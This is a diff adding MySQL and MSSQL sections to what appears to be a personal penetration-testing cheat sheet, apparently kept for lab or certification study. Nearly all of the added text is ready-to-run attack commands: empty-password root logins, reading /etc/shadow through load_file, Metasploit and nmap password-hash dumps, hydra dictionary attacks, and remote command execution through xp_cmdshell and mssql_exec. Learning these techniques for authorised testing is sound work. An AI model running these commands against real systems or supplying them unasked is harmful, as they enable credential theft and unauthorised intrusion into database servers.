@@ -248,6 +248,65 @@ With an anonymous null session you can access the IPC$ share and interact with s
     - ROBOTS.TXT: use auxiliary/scanner/http/robots_txt
   
   
+  ## MySQL
+  
+  - Connect to mysql via shell
+    - mysql -h x.x.x.x -u root
+  - show databases;
+  - use <database>;
+  - select * from <table>;
+  - metasploit enumeration on writeable directories of the operating system
+    - use auxiliary/scanner/mysql/mysql_writable_dirs (set options (dir_list etc.) and run the exploit and maybe set verbose to false because it will tell us a lot :D )
+  - dump hashes with metasploit
+    - use auxiliary/scanner/maysql/mysql_hashdump -> set at least username and password and rhosts -> WRITE HASHES DOWN!
+  - load system files (if we have access which should be present to previous enumeration)
+    - select load_file("/etc/shadow"); -> if that works, WRITE THAT DOWN!
+  - check for empty password login with nmap
+    - nmap x.x.x.x -sV -p 3306 --script=mysql-empty-password
+  - nmap x.x.x.x -sV -p3306 --script=mysql-users --script-args="mysqluser='root,mysqlpass=''" -> Write all users down
+  - nmap x.x.x.x -sV -p3306 --script=mysql-databases --script-args="mysqluser='root,mysqlpass=''" -> Shows all Databases
+  - nmap mysql-audit script can be useful. Check documentation for more info!
+  
+  - DICTIONARY ATTACK
+    - via msfconsole -> use auxiliary/scanner/mysql/mysql_login -> set all options (pass_file etc.), set stop_on_success true and verbose to false!
+    - via hydra -> hydra -l root -P <wordlist> x.x.x.x mysql
+  
+  ##MSSQL
+  - nmap x.x.x.x -p1433 --script ms-sql-info -> general information
+  - nmap x.x.x.x -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -> ntlm info
+  - nmap x.x.x.x -p1433 --script ms-sql-brute --script-args userdb=<PATH>,passdb=<PATH> -> Bruteforce / Dictionary Attack
+  - nmap x.x.x.x -p1433 --script ms-sql-empty-password -> Check for empty passwords
+  
+  - hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt 192.168.1.128 mssql
+  
+  - you can also run querys with nmap, check the documentation.
+  
+  - nmap x.x.x.x -p1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
+  
+  - Run cmd command:
+    - nmap x.x.x.x -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xpcmdshell.cmd="ipconfig" -> Just an example
+    - nmap x.x.x.x -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xpcmdshell.cmd="type c:\flag"
+  
+  
+  - Enumerate MSSQL with Metasploit
+    - use auxiliary/scanner/mssql/mssql_login -> set rhosts; set user_file; set pass_file -> exploit
+    - use auxiliary/admin/mssql/mssql_enum -> set rhosts at least...
+    - use auxiliary/admin/mssql/mssql_enum_sql_logins -> Enumerating possible Logins
+    - use auxiliary/admin/mssql/mssql_exec -> check if you can run commands -> set cmd whoami (just as an example)
+    - use auxiliary/admin/mssql/mssql_enum_domain_accounts
+    - 
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
   
   
   
